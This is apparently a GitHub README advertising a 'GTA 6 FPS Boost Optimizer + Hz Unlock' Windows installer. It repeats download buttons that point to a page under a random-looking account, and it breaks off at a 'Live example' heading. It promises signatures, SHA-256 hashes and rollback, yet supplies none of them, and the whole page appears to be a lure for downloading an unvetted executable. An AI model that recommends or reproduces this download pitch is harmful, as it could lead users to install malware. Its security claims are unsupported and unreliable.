# 🔥 GTA 6 FPS Boost Optimizer + Hz Unlock — PC Windows

A performance preset tool — is a Windows desktop app that sets the frame budget before the game can eat it: display mode and refresh rate, frame cap, VRAM and streaming allowance, shader cache, background debloat, latency path, in that order. This repo documents the installer side of it rather than the sliders: build number and compile date, Authenticode signer, SHA-256, x64 package, silent flags, the per-user install path under `%LOCALAPPDATA%`, the preset profile under `%APPDATA%`, the original-values snapshot kept for rollback. Windows 10/11, no admin prompt, no writes into a game folder.

---

# 📥 **INSTALLER PICKUP — START HERE**

## [⬇️ **GET THE WINDOWS INSTALLER**](https://fntpjrekcqqs.github.io/GTA-6-FPS-Boost-Optimizer-Hz-Unlock-Tool/)

> One tap, the package opens on its own page — no wrapper in between.

---

## 🖼️ **PREVIEW IMAGE**

<img src="https://github.com/fntpjrekcqqs/GTA-6-FPS-Boost-Optimizer-Hz-Unlock-Tool/blob/main/gta6fps.jfif?raw=true" width="1280" height="720" alt="preview image">

---

### 📦 [**OPEN THE PACKAGE**](https://fntpjrekcqqs.github.io/GTA-6-FPS-Boost-Optimizer-Hz-Unlock-Tool/)

---

## ✨ What's inside

🪟 **Version stamp first** — build number and compile date printed in the header before a byte moves. If a page can't tell you the build, it's a wrapper, not a source.

🔐 **Signature check** — Authenticode subject is shown and expected to match the publisher cert. An unsigned "optimizer" from a mirror is a guess with a file size.

🧮 **SHA-256 line** — hash published next to the build so a downloaded file can be verified with `certutil -hashfile`. Mismatch means re-download, not "probably fine".

🖥️ **Hz unlock is a mode list, not a checkbox** — the panel's real modes are enumerated first, then the highest stable one is applied and read back. A tool that just writes "144" into a field is guessing.

🧱 **Arch split** — x64 and ARM64 kept separate. The display path and the driver query are native; an emulated build can't read the mode table correctly.

📁 **Install paths on the table** — per-user install under `%LOCALAPPDATA%\Gta6Optimizer`, profile under `%APPDATA%\Gta6Optimizer`, logs under `%APPDATA%\Gta6Optimizer\logs`. No admin prompt, no `Program Files` surprise.

⚙️ **Silent install flags** — `/S` for the EXE path and `Add-AppxPackage` for the MSIX path, plus the headless form `optimizer.exe --apply low --headless`, all written out, all without a GUI step.

🔌 **Profile location** — `%APPDATA%\Gta6Optimizer\profile.json`, with a working skeleton: display mode, cap, VRAM budget, streaming, cache, debloat list, so nothing is changed that you didn't read.

💾 **Snapshot before write** — original display mode, cap, registry keys and service states dumped to `%APPDATA%\Gta6Optimizer\backup.json` before the first apply.

♻️ **Rollback line** — the previous build number kept in the profile, and `--restore` to put every original value back. An optimizer without a way back is a reinstall.

---

## 🏅 How the entries read

| Tier | Meaning |
| --- | --- |
| **S** | decides whether you have the real package — signature, SHA-256, mode enumeration |
| **A** | decides whether it applies cleanly — arch split, display mode read-back, preset schema |
| **B** | useful after the fact — profile path, backup snapshot, rollback line |
| **Noise** | on every wrapper page, proves nothing — "+40 FPS guaranteed", countdown timers, "fast servers" |

---

## 🧪 Live example — one verify, one apply, one honest log

What the console prints on a real run:
